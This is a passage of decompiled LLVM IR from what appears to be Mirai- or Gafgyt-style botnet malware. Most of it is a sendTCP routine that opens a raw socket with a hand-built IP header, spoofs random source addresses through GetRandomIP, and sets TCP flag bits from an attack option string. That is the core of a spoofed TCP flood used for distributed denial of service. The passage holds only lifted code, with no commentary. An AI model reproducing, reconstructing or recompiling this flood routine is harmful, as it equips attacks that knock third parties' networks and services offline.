  store i32 %v1_804b789, i32* %edx.global-to-local, align 4
  store i16 %v5_804b781, i16* %v4_804b6b8, align 2
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v15_804b795 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804b798 = icmp eq i1 %v15_804b795, false
  br i1 %v1_804b798, label %dec_label_pc_804b7b8, label %dec_label_pc_804b79a

dec_label_pc_804b79a:                             ; preds = %dec_label_pc_804b732
  %v0_804b79a = load i32, i32* @esp, align 4
  %v1_804b79d = add i32 %v0_804b79a, -16
  %v2_804b79d = inttoptr i32 %v1_804b79d to i32*
  store i32 0, i32* %v2_804b79d, align 4
  %v2_804b79f = inttoptr i32 %v1_804b73d to i32*
  %v3_804b79f = call i32 @__GI_time(i32* %v2_804b79f)
  store i32 %v3_804b79f, i32* %eax.global-to-local, align 4
  %v0_804b7a4 = load i32, i32* @esp, align 4
  %v1_804b7a4 = add i32 %v0_804b7a4, 16
  %v8_804b7aa = icmp sgt i32 %v3_804b79f, %v5_804b6c9
  br i1 %v8_804b7aa, label %dec_label_pc_804b802, label %dec_label_pc_804b6df

dec_label_pc_804b7b8:                             ; preds = %dec_label_pc_804b732
  %v4_804b7b8 = add i32 %stack_var_-84.0, 1
  store i32 %arg7, i32* %eax.global-to-local, align 4
  %v15_804b7be = icmp eq i32 %stack_var_-80.0.ph, %arg7
  %v1_804b7c1 = icmp eq i1 %v15_804b7be, false
  br i1 %v1_804b7c1, label %dec_label_pc_804b7fa, label %dec_label_pc_804b7c3

dec_label_pc_804b7c3:                             ; preds = %dec_label_pc_804b7b8
  store i32 %v1_804b7d6, i32* %edx.global-to-local, align 4
  store i32 %v2_804b7df, i32* %eax.global-to-local, align 4
  %v0_804b7e2 = load i32, i32* @esp, align 4
  %v2_804b7e5 = add i32 %v0_804b7e2, -16
  %v3_804b7e5 = inttoptr i32 %v2_804b7e5 to i32*
  store i32 %v2_804b7df, i32* %v3_804b7e5, align 4
  %v1_804b7e6 = sext i32 %v4_804b7b8 to i64
  %v2_804b7e6 = call i32 @usleep(i64 %v1_804b7e6)
  store i32 %v2_804b7e6, i32* %eax.global-to-local, align 4
  %v0_804b7eb = load i32, i32* @esp, align 4
  %v1_804b7eb = add i32 %v0_804b7eb, 16
  br label %dec_label_pc_804b6df.outer

dec_label_pc_804b7fa:                             ; preds = %dec_label_pc_804b7b8
  %v4_804b7fa = add i32 %stack_var_-80.0.ph, 1
  %v0_804b6e5.pre.pre.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804b6df.outer

dec_label_pc_804b802:                             ; preds = %dec_label_pc_804b79a, %dec_label_pc_804b521, %dec_label_pc_804b4e3
  %v0_804b80b33 = phi i32 [ %v3_804b52f, %dec_label_pc_804b521 ], [ %v3_804b4f1, %dec_label_pc_804b4e3 ], [ %v3_804b79f, %dec_label_pc_804b79a ]
  br label %dec_label_pc_804b805

dec_label_pc_804b805:                             ; preds = %dec_label_pc_804b45b, %dec_label_pc_804b3c7, %dec_label_pc_804b352, %dec_label_pc_804b3ac, %dec_label_pc_804b802
  %v0_804b80b = phi i32 [ 0, %dec_label_pc_804b3c7 ], [ %v4_804b35f, %dec_label_pc_804b352 ], [ %v3_804b3ba, %dec_label_pc_804b3ac ], [ %v0_804b80b33, %dec_label_pc_804b802 ], [ %v2_804b460, %dec_label_pc_804b45b ]
  store i32 %v0_804b31f, i32* @ebx, align 4
  ret i32 %v0_804b80b

; uselistorder directives
  uselistorder i32 %v4_804b7b8, { 2, 1, 0 }
  uselistorder i32 %v0_804b75d, { 1, 0 }
  uselistorder i32 %v1_804b742, { 1, 0 }
  uselistorder i32 %v1_804b73d, { 3, 2, 1, 0 }
  uselistorder i16 %storemerge, { 3, 1, 0, 2 }
  uselistorder i32 %v1_804b701, { 1, 0 }
  uselistorder i32 %v0_804b6e5, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %stack_var_-80.0.ph, { 3, 0, 4, 2, 1 }
  uselistorder i32 %v0_804b694, { 1, 0 }
  uselistorder i32 %v4_804b675, { 3, 2, 1, 0 }
  uselistorder i32 %v1_804b71d.pre-phi, { 1, 0 }
  uselistorder i32 %v1_804b65d, { 2, 1, 0 }
  uselistorder i32 %v1_804b641, { 1, 0 }
  uselistorder i32 %v1_804b622, { 1, 0 }
  uselistorder i32 %v2_804b5c6, { 9, 8, 7, 6, 17, 16, 15, 5, 4, 14, 3, 13, 12, 11, 10, 2, 1, 0 }
  uselistorder i32 %v2_804b59c, { 1, 0 }
  uselistorder i32 %v4_804b4d2, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v4_804b47a, { 1, 0 }
  uselistorder i32 %stack_var_-88.0.ph, { 1, 0 }
  uselistorder i32 %v2_804b4a1, { 1, 0 }
  uselistorder i32 %v1_804b3cf, { 4, 3, 1, 2, 0, 5 }
  uselistorder i32 %v1_804b3ca, { 2, 1, 0, 3 }
  uselistorder i32 %v4_804b39b, { 1, 0, 2, 3 }
  uselistorder i32 %v2_804b355, { 2, 3, 0, 1 }
  uselistorder i32 %v1_804b33d, { 1, 0 }
  uselistorder i32 %v12_804b320, { 1, 2, 0, 3 }
  uselistorder i32* %stack_var_-68, { 1, 0 }
  uselistorder i32* %stack_var_-64, { 1, 0, 2 }
  uselistorder i32* %stack_var_-156, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9, 10, 11, 12, 14, 13, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 %arg7, { 0, 3, 1, 2 }
  uselistorder i32 %arg6, { 0, 3, 1, 2, 4 }
  uselistorder i32 %arg5, { 7, 6, 5, 4, 0, 3, 1, 2 }
  uselistorder i32 %arg4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804b805, { 4, 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_804b732, { 1, 0 }
  uselistorder label %dec_label_pc_804b6df, { 1, 0 }
  uselistorder label %dec_label_pc_804b6df.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b672, { 1, 0 }
  uselistorder label %dec_label_pc_804b5a3, { 1, 0 }
  uselistorder label %bb84, { 1, 0 }
  uselistorder label %dec_label_pc_804b545, { 1, 0 }
  uselistorder label %dec_label_pc_804b45b, { 1, 0 }
  uselistorder label %dec_label_pc_804b427, { 1, 0 }
  uselistorder label %dec_label_pc_804b427.outer, { 1, 0, 2 }
  uselistorder label %dec_label_pc_804b352, { 1, 0 }
}

define i32 @sendTCP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i8* %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cf.global-to-local = alloca i1, align 1
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp48 = call i16 @__decompiler_undefined_function_5()
  %tmp49 = call i32 @__decompiler_undefined_function_0()
  %tmp50 = call i8* @__decompiler_undefined_function_2()
  %stack_var_-20 = alloca i8*, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-172 = alloca i32, align 4
  %v0_804b810 = load i32, i32* @esi, align 4
  %v0_804b811 = load i32, i32* @ebx, align 4
  %v15_804b812 = ptrtoint i32* %stack_var_-172 to i32
  store i32 %arg7, i32* %eax.global-to-local, align 4
  store i32 2, i32* %stack_var_-60, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b829 = icmp eq i32 %arg2, 0
  %v1_804b82d = icmp eq i1 %v4_804b829, false
  br i1 %v1_804b82d, label %dec_label_pc_804b83a, label %dec_label_pc_804b82f

dec_label_pc_804b82f:                             ; preds = %entry
  %v1_804b82f = call i32 @rand_cmwc(i32 %v15_804b812)
  store i32 %v1_804b82f, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b852

dec_label_pc_804b83a:                             ; preds = %entry
  %v1_804b83d = urem i32 %arg2, 65536
  store i32 %v1_804b83d, i32* %eax.global-to-local, align 4
  %v5_804b842 = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804b842, i1* %cf.global-to-local, align 1
  %v1_804b846 = call i32 @htons(i32 %v1_804b83d)
  store i32 %v1_804b846, i32* %eax.global-to-local, align 4
  %v0_804b84b = load i32, i32* @esp, align 4
  %v2_804b84b = icmp ugt i32 %v0_804b84b, -17
  store i1 %v2_804b84b, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804b852

dec_label_pc_804b852:                             ; preds = %dec_label_pc_804b82f, %dec_label_pc_804b83a
  %v2_804b855 = ptrtoint i32* %stack_var_-60 to i32
  %v5_804b858 = icmp eq i32* %stack_var_-60, inttoptr (i32 -4 to i32*)
  store i1 %v5_804b858, i1* %cf.global-to-local, align 1
  %v15_804b858 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v15_804b858, i32* %eax.global-to-local, align 4
  %v4_804b85f = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-56)
  store i32 %v4_804b85f, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804b867 = icmp eq i32 %v4_804b85f, 0
  br i1 %v1_804b867, label %dec_label_pc_804b870, label %dec_label_pc_804bd93

dec_label_pc_804b870:                             ; preds = %dec_label_pc_804b852
  %v15_804b873 = ptrtoint i32* %stack_var_-52 to i32
  store i32 %v15_804b873, i32* %eax.global-to-local, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v5_804b883 = icmp ult i32* %stack_var_-172, inttoptr (i32 4 to i32*)
  store i1 %v5_804b883, i1* %cf.global-to-local, align 1
  %v4_804b88c = call i32 @socket(i32 2, i32 3, i32 6)
  store i32 %v4_804b88c, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b897 = icmp eq i32 %v4_804b88c, 0
  %v1_804b89b = icmp eq i1 %v4_804b897, false
  br i1 %v1_804b89b, label %dec_label_pc_804b8b8, label %dec_label_pc_804b89d

dec_label_pc_804b89d:                             ; preds = %dec_label_pc_804b870
  %v0_804b89d = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804b89d, i32* %eax.global-to-local, align 4
  %v5_804b8a2 = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804b8a2, i1* %cf.global-to-local, align 1
  %v3_804b8ab = call i32 @Rootsprintf(i32 %v0_804b89d, i32 ptrtoint ([27 x i8]* @global_var_80564b0.140 to i32))
  store i32 %v3_804b8ab, i32* %eax.global-to-local, align 4
  %v0_804b8b0 = load i32, i32* @esp, align 4
  %v2_804b8b0 = icmp ugt i32 %v0_804b8b0, -17
  store i1 %v2_804b8b0, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bd93

dec_label_pc_804b8b8:                             ; preds = %dec_label_pc_804b870
  store i32 1, i32* %stack_var_-64, align 4
  %v5_804b8bf = icmp ult i32* %stack_var_-172, inttoptr (i32 12 to i32*)
  store i1 %v5_804b8bf, i1* %cf.global-to-local, align 1
  %v2_804b8c4 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_804b8c4, i32* %eax.global-to-local, align 4
  %v5_804b8cf = call i32 @__GI_setsockopt(i32 %v4_804b88c, i32 0, i32 3, i32 %v2_804b8c4, i32 4)
  store i32 %v5_804b8cf, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v2_804b8d7 = icmp slt i32 %v5_804b8cf, 0
  %v1_804b8d9 = icmp eq i1 %v2_804b8d7, false
  br i1 %v1_804b8d9, label %dec_label_pc_804b8f6, label %dec_label_pc_804b8db

dec_label_pc_804b8db:                             ; preds = %dec_label_pc_804b8b8
  %v0_804b8db = load i32, i32* @global_var_8059b00.18, align 256
  store i32 %v0_804b8db, i32* %eax.global-to-local, align 4
  %v5_804b8e0 = icmp ult i32* %stack_var_-172, inttoptr (i32 8 to i32*)
  store i1 %v5_804b8e0, i1* %cf.global-to-local, align 1
  %v3_804b8e9 = call i32 @Rootsprintf(i32 %v0_804b8db, i32 ptrtoint ([33 x i8]* @global_var_80564cc.141 to i32))
  store i32 %v3_804b8e9, i32* %eax.global-to-local, align 4
  %v0_804b8ee = load i32, i32* @esp, align 4
  %v2_804b8ee = icmp ugt i32 %v0_804b8ee, -17
  store i1 %v2_804b8ee, i1* %cf.global-to-local, align 1
  br label %dec_label_pc_804bd93

dec_label_pc_804b8f6:                             ; preds = %dec_label_pc_804b8b8
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804b8f6 = icmp eq i32 %arg4, 0
  %v1_804b8fa = icmp eq i1 %v4_804b8f6, false
  br i1 %v1_804b8fa, label %dec_label_pc_804b905, label %dec_label_pc_804b91b

dec_label_pc_804b905:                             ; preds = %dec_label_pc_804b8f6
  %v5_804b90c = sub i32 32, %arg4
  %v10_804b90c = icmp ugt i32 %arg4, 32
  store i1 %v10_804b90c, i1* %cf.global-to-local, align 1
  store i32 1, i32* %eax.global-to-local, align 4
  %v2_804b914 = urem i32 %v5_804b90c, 32
  %v4_804b914 = icmp eq i32 %v2_804b914, 0
  br i1 %v4_804b914, label %bb103, label %bb

bb:                                               ; preds = %dec_label_pc_804b905
  %v5_804b914 = shl i32 1, %v2_804b914
  store i32 %v5_804b914, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br label %bb103

bb103:                                            ; preds = %dec_label_pc_804b905, %bb
  %v0_804b916 = phi i32 [ 1, %dec_label_pc_804b905 ], [ %v5_804b914, %bb ]
  %v1_804b916 = sub i32 0, %v0_804b916
  store i1 true, i1* %cf.global-to-local, align 1
  store i32 %v1_804b916, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804b91b

dec_label_pc_804b91b:                             ; preds = %dec_label_pc_804b8f6, %bb103
  %storemerge13 = phi i32 [ %v1_804b916, %bb103 ], [ 0, %dec_label_pc_804b8f6 ]
  %v1_804b91e = add i32 %arg6, 40
  %v1_804b92a = add i32 %arg6, 70
  %v2_804b92d = and i32 %v1_804b92a, -16
  %v2_804b933 = sub i32 %v15_804b812, %v2_804b92d
  %v1_804b93b = add i32 %v2_804b933, 15
  %v2_804b93e = and i32 %v1_804b93b, -16
  store i32 %v2_804b93e, i32* %edx.global-to-local, align 4
  %v1_804b956 = add i32 %v2_804b93e, 20
  %v5_804b959 = inttoptr i32 %v1_804b956 to i16*
  %v1_804b95f = add i32 %arg6, 20
  store i32 %v1_804b95f, i32* %eax.global-to-local, align 4
  store i32 %v1_804b95f, i32* @ebx, align 4
  %v5_804b964 = icmp ult i32 %v2_804b933, 12
  store i1 %v5_804b964, i1* %cf.global-to-local, align 1
  %v5_804b967 = add i32 %v2_804b933, -16
  %v6_804b967 = inttoptr i32 %v5_804b967 to i32*
  store i32 %storemerge13, i32* %v6_804b967, align 4
  %v2_804b96a = call i32 @GetRandomIP(i32 %v1_804b91e, i32 %v2_804b93e)
  store i32 %v2_804b96a, i32* %eax.global-to-local, align 4
  %v0_804b96f = load i32, i32* @esp, align 4
  %v1_804b96f = add i32 %v0_804b96f, 16
  %v5_804b972 = icmp ult i32 %v1_804b96f, 12
  store i1 %v5_804b972, i1* %cf.global-to-local, align 1
  %v3_804b975 = inttoptr i32 %v0_804b96f to i32*
  store i32 %v2_804b96a, i32* %v3_804b975, align 4
  %v0_804b976 = call i32 @htonl()
  store i32 %v0_804b976, i32* %eax.global-to-local, align 4
  %v0_804b97b = load i32, i32* @esp, align 4
  %v3_804b97e = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_804b97e, i32* %edx.global-to-local, align 4
  %tmp106 = and i32 %v0_804b97b, -4
  %v5_804b981 = icmp eq i32 %tmp106, -16
  store i1 %v5_804b981, i1* %cf.global-to-local, align 1
  %v0_804b984 = load i32, i32* @ebx, align 4
  %v2_804b984 = add i32 %v0_804b97b, 8
  %v3_804b984 = inttoptr i32 %v2_804b984 to i32*
  store i32 %v0_804b984, i32* %v3_804b984, align 4
  %v1_804b985 = add i32 %v0_804b97b, 4
  %v2_804b985 = inttoptr i32 %v1_804b985 to i32*
  store i32 6, i32* %v2_804b985, align 4
  %v3_804b987 = inttoptr i32 %v0_804b97b to i32*
  store i32 %v0_804b976, i32* %v3_804b987, align 4
  %v0_804b988 = load i32, i32* %edx.global-to-local, align 4
  %v2_804b988 = add i32 %v0_804b97b, -4
  %v3_804b988 = inttoptr i32 %v2_804b988 to i32*
  store i32 %v0_804b988, i32* %v3_804b988, align 4
  %v5_804b989 = add i32 %v0_804b97b, -8
  %v6_804b989 = inttoptr i32 %v5_804b989 to i32*
  store i32 %v2_804b93e, i32* %v6_804b989, align 4
  %v0_804b98c = call i32 @makeIPPacket()
  store i32 %v0_804b98c, i32* %eax.global-to-local, align 4
  %v0_804b991 = load i32, i32* @esp, align 4
  %v5_804b991 = icmp ugt i32 %v0_804b991, -25
  store i1 %v5_804b991, i1* %cf.global-to-local, align 1
  %v2_804b994 = call i32 @rand_cmwc(i32 %v1_804b956)
  %sext = mul i32 %v2_804b994, 65536
  %v1_804b999 = sdiv i32 %sext, 65536
  store i32 %v1_804b999, i32* %edx.global-to-local, align 4
  store i32 %v1_804b956, i32* %eax.global-to-local, align 4
  %v1_804b99e = trunc i32 %v1_804b999 to i16
  store i16 %v1_804b99e, i16* %v5_804b959, align 4
  %v2_804b9a1 = call i32 @rand_cmwc(i32 %v1_804b956)
  %v2_804b9ab = add i32 %v2_804b93e, 24
  %v3_804b9ab = inttoptr i32 %v2_804b9ab to i32*
  store i32 %v2_804b9a1, i32* %v3_804b9ab, align 8
  store i32 %v1_804b956, i32* %eax.global-to-local, align 4
  %v1_804b9b1 = add i32 %v2_804b93e, 28
  %v2_804b9b1 = inttoptr i32 %v1_804b9b1 to i32*
  store i32 0, i32* %v2_804b9b1, align 4
  store i32 %v1_804b956, i32* %edx.global-to-local, align 4
  %v1_804b9bb = add i32 %v2_804b93e, 32
  %v2_804b9bb = inttoptr i32 %v1_804b9bb to i8*
  %v3_804b9bb = load i8, i8* %v2_804b9bb, align 16
  %v1_804b9be = urem i8 %v3_804b9bb, 16
  %v1_804b9c1 = or i8 %v1_804b9be, 80
  store i1 false, i1* %cf.global-to-local, align 1
  store i8 %v1_804b9c1, i8* %v2_804b9bb, align 16
  %v4_804b9c7 = ptrtoint i8* %arg5 to i32
  store i32 %v4_804b9c7, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804b9c7, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564ed.142 to i32), i32* @edi, align 4
  %v6_804b9e5 = call i32 @_strncmp(i8* %arg5, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564ed.142, i32 0, i32 0), i32 4)
  %v7_804b9e5 = urem i32 %v6_804b9e5, 2
  %v8_804b9e5 = icmp eq i32 %v7_804b9e5, 0
  %v0_804b9e7 = load i1, i1* %cf.global-to-local, align 1
  %v2_804b9e7 = or i1 %v0_804b9e7, %v8_804b9e5
  %v3_804b9e7 = zext i1 %v2_804b9e7 to i32
  %v4_804b9e7 = load i32, i32* %edx.global-to-local, align 4
  %v5_804b9e7 = and i32 %v4_804b9e7, -256
  %v6_804b9e7 = or i32 %v3_804b9e7, %v5_804b9e7
  %v7_804b9e7 = xor i32 %v6_804b9e7, 1
  store i32 %v7_804b9e7, i32* @edx, align 4
  %v3_804b9ed = and i32 %v6_804b9e5, -256
  %v1_804b9ef = trunc i32 %v7_804b9e7 to i8
  %v3_804b9ef = zext i1 %v0_804b9e7 to i8
  %v4_804b9ef = sub nsw i8 %v1_804b9ef, %v3_804b9ef
  %v15_804b9ef = icmp eq i8 %v4_804b9ef, 0
  %v20_804b9ef = zext i8 %v4_804b9ef to i32
  %v23_804b9ef = or i32 %v20_804b9ef, %v3_804b9ed
  store i32 %v23_804b9ef, i32* @ecx, align 4
  %v2_804b9f3 = sext i8 %v4_804b9ef to i32
  store i32 %v2_804b9f3, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804b9f8 = icmp eq i1 %v15_804b9ef, false
  br i1 %v1_804b9f8, label %dec_label_pc_804ba3b, label %dec_label_pc_804b9fa

dec_label_pc_804b9fa:                             ; preds = %dec_label_pc_804b91b
  store i32 %v1_804b956, i32* %edx.global-to-local, align 4
  %v1_804b9fd = add i32 %v2_804b93e, 33
  %v2_804b9fd = inttoptr i32 %v1_804b9fd to i8*
  %v3_804b9fd = load i8, i8* %v2_804b9fd, align 1
  %v4_804b9fd = zext i8 %v3_804b9fd to i32
  %v6_804b9fd = and i32 %v2_804b9f3, -256
  %v7_804b9fd = or i32 %v6_804b9fd, %v4_804b9fd
  %v1_804ba00 = or i32 %v7_804b9fd, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba00 = trunc i32 %v1_804ba00 to i8
  store i32 %v1_804ba00, i32* %eax.global-to-local, align 4
  store i8 %v3_804ba00, i8* %v2_804b9fd, align 1
  store i32 %v1_804b956, i32* %edx.global-to-local, align 4
  %v3_804ba09 = load i8, i8* %v2_804b9fd, align 1
  %v4_804ba09 = zext i8 %v3_804ba09 to i32
  %v5_804ba09 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ba09 = and i32 %v5_804ba09, -256
  %v7_804ba09 = or i32 %v4_804ba09, %v6_804ba09
  %v1_804ba0c = or i32 %v7_804ba09, 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba0c = trunc i32 %v1_804ba0c to i8
  store i32 %v1_804ba0c, i32* %eax.global-to-local, align 4
  store i8 %v3_804ba0c, i8* %v2_804b9fd, align 1
  store i32 %v1_804b956, i32* %edx.global-to-local, align 4
  %v3_804ba15 = load i8, i8* %v2_804b9fd, align 1
  %v4_804ba15 = zext i8 %v3_804ba15 to i32
  %v5_804ba15 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ba15 = and i32 %v5_804ba15, -256
  %v7_804ba15 = or i32 %v4_804ba15, %v6_804ba15
  %v1_804ba18 = or i32 %v7_804ba15, 1
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba18 = trunc i32 %v1_804ba18 to i8
  store i32 %v1_804ba18, i32* %eax.global-to-local, align 4
  store i8 %v3_804ba18, i8* %v2_804b9fd, align 1
  store i32 %v1_804b956, i32* %edx.global-to-local, align 4
  %v3_804ba21 = load i8, i8* %v2_804b9fd, align 1
  %v4_804ba21 = zext i8 %v3_804ba21 to i32
  %v5_804ba21 = load i32, i32* %eax.global-to-local, align 4
  %v6_804ba21 = and i32 %v5_804ba21, -256
  %v7_804ba21 = or i32 %v4_804ba21, %v6_804ba21
  %v1_804ba24 = or i32 %v7_804ba21, 16
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba24 = trunc i32 %v1_804ba24 to i8
  store i32 %v1_804ba24, i32* %eax.global-to-local, align 4
  store i8 %v3_804ba24, i8* %v2_804b9fd, align 1
  store i32 %v1_804b956, i32* %edx.global-to-local, align 4
  %v3_804ba2d = load i8, i8* %v2_804b9fd, align 1
  %v4_804ba2d = zext i8 %v3_804ba2d to i32
  %v5_804ba2d = load i32, i32* %eax.global-to-local, align 4
  %v6_804ba2d = and i32 %v5_804ba2d, -256
  %v7_804ba2d = or i32 %v4_804ba2d, %v6_804ba2d
  %v1_804ba30 = or i32 %v7_804ba2d, 8
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba30 = trunc i32 %v1_804ba30 to i8
  store i32 %v1_804ba30, i32* %eax.global-to-local, align 4
  store i8 %v3_804ba30, i8* %v2_804b9fd, align 1
  %v0_804bc07.pre = load i8*, i8** %stack_var_-20, align 4
  br label %dec_label_pc_804bc07

dec_label_pc_804ba3b:                             ; preds = %dec_label_pc_804b91b
  store i32 %v4_804b9c7, i32* @eax, align 4
  %v0_804ba3e = load i32, i32* @esp, align 4
  %v5_804ba3e = icmp ult i32 %v0_804ba3e, 8
  store i1 %v5_804ba3e, i1* %cf.global-to-local, align 1
  %v1_804ba41 = add i32 %v0_804ba3e, -12
  %v2_804ba41 = inttoptr i32 %v1_804ba41 to i32*
  store i32 ptrtoint (i32* @global_var_80564f1.143 to i32), i32* %v2_804ba41, align 4
  %v0_804ba46 = load i32, i32* @eax, align 4
  %v2_804ba46 = add i32 %v0_804ba3e, -16
  %v3_804ba46 = inttoptr i32 %v2_804ba46 to i32*
  store i32 %v0_804ba46, i32* %v3_804ba46, align 4
  %v3_804ba47 = call i32 @__GI_strtok(i32 4, i32 ptrtoint ([4 x i8]* @global_var_80564ed.142 to i32))
  store i32 %v3_804ba47, i32* %eax.global-to-local, align 4
  %v5_804ba4f = inttoptr i32 %v3_804ba47 to i8*
  store i8* %v5_804ba4f, i8** %stack_var_-20, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v5_804bbfd22 = icmp eq i32 %v3_804ba47, 0
  %v1_804bc0129 = icmp eq i1 %v5_804bbfd22, false
  br i1 %v1_804bc0129, label %dec_label_pc_804ba57.lr.ph, label %dec_label_pc_804bc07

dec_label_pc_804ba57.lr.ph:                       ; preds = %dec_label_pc_804ba3b
  %v1_804bbc4 = add i32 %v2_804b93e, 33
  %v2_804bbc4 = inttoptr i32 %v1_804bbc4 to i8*
  %tmp104 = bitcast i8** %stack_var_-20 to i32*
  br label %dec_label_pc_804ba57

dec_label_pc_804ba57:                             ; preds = %dec_label_pc_804ba57.lr.ph, %dec_label_pc_804bbe8
  %v3_804bbd7 = phi i8* [ %v5_804ba4f, %dec_label_pc_804ba57.lr.ph ], [ %tmp105, %dec_label_pc_804bbe8 ]
  %stack_var_-156.131 = phi i8* [ %tmp50, %dec_label_pc_804ba57.lr.ph ], [ %stack_var_-156.0, %dec_label_pc_804bbe8 ]
  %stack_var_-160.130 = phi i32 [ %tmp49, %dec_label_pc_804ba57.lr.ph ], [ %stack_var_-160.0, %dec_label_pc_804bbe8 ]
  %v4_804ba57 = ptrtoint i8* %v3_804bbd7 to i32
  store i32 %v4_804ba57, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba57, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564f3.144 to i32), i32* @edi, align 4
  %v6_804ba75 = call i32 @_strncmp(i8* %v3_804bbd7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564f3.144, i32 0, i32 0), i32 4)
  %v7_804ba75 = urem i32 %v6_804ba75, 2
  %v8_804ba75 = icmp eq i32 %v7_804ba75, 0
  %v0_804ba77 = load i1, i1* %cf.global-to-local, align 1
  %v2_804ba77 = or i1 %v0_804ba77, %v8_804ba75
  %v3_804ba77 = zext i1 %v2_804ba77 to i32
  %v4_804ba77 = load i32, i32* @edx, align 4
  %v5_804ba77 = and i32 %v4_804ba77, -256
  %v6_804ba77 = or i32 %v3_804ba77, %v5_804ba77
  %v7_804ba77 = xor i32 %v6_804ba77, 1
  store i32 %v7_804ba77, i32* %edx.global-to-local, align 4
  %v3_804ba7d = and i32 %v6_804ba75, -256
  %v1_804ba7f = trunc i32 %v7_804ba77 to i8
  %v3_804ba7f = zext i1 %v0_804ba77 to i8
  %v4_804ba7f = sub nsw i8 %v1_804ba7f, %v3_804ba7f
  %v15_804ba7f = icmp eq i8 %v4_804ba7f, 0
  %v20_804ba7f = zext i8 %v4_804ba7f to i32
  %v23_804ba7f = or i32 %v20_804ba7f, %v3_804ba7d
  store i32 %v23_804ba7f, i32* @ecx, align 4
  %v2_804ba83 = sext i8 %v4_804ba7f to i32
  store i32 %v2_804ba83, i32* %eax.global-to-local, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ba88 = icmp eq i1 %v15_804ba7f, false
  br i1 %v1_804ba88, label %dec_label_pc_804ba9b, label %dec_label_pc_804ba8a

dec_label_pc_804ba8a:                             ; preds = %dec_label_pc_804ba57
  store i32 %v1_804b956, i32* @eax, align 4
  %v3_804ba8d = load i8, i8* %v2_804bbc4, align 1
  %v4_804ba8d = zext i8 %v3_804ba8d to i32
  %v7_804ba8d = or i32 %v5_804ba77, %v4_804ba8d
  %v1_804ba90 = or i32 %v7_804ba8d, 2
  store i1 false, i1* %cf.global-to-local, align 1
  %v3_804ba90 = trunc i32 %v1_804ba90 to i8
  store i32 %v1_804ba90, i32* @edx, align 4
  store i8 %v3_804ba90, i8* %v2_804bbc4, align 1
  br label %dec_label_pc_804bbe8

dec_label_pc_804ba9b:                             ; preds = %dec_label_pc_804ba57
  store i32 %v4_804ba57, i32* %eax.global-to-local, align 4
  store i1 false, i1* @df, align 1
  store i32 %v4_804ba57, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_80564f7.145 to i32), i32* @edi, align 4
  %v6_804bab9 = call i32 @_strncmp(i8* %v3_804bbd7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_80564f7.145, i32 0, i32 0), i32 4)
  %v7_804bab9 = urem i32 %v6_804bab9, 2
  %v8_804bab9 = icmp eq i32 %v7_804bab9, 0
  %v0_804babb = load i1, i1* %cf.global-to-local, align 1
  %v2_804babb = or i1 %v0_804babb, %v8_804bab9
  %v3_804babb = zext i1 %v2_804babb to i32
  %v4_804babb = load i32, i32* %edx.global-to-local, align 4
  %v5_804babb = and i32 %v4_804babb, -256
  %v6_804babb = or i32 %v3_804babb, %v5_804babb
  %v7_804babb = xor i32 %v6_804babb, 1
  store i32 %v7_804babb, i32* %edx.global-to-local, align 4
  %v3_804bac1 = and i32 %v6_804bab9, -256
  %v1_804bac3 = trunc i32 %v7_804babb to i8
  %v3_804bac3 = zext i1 %v0_804babb to i8
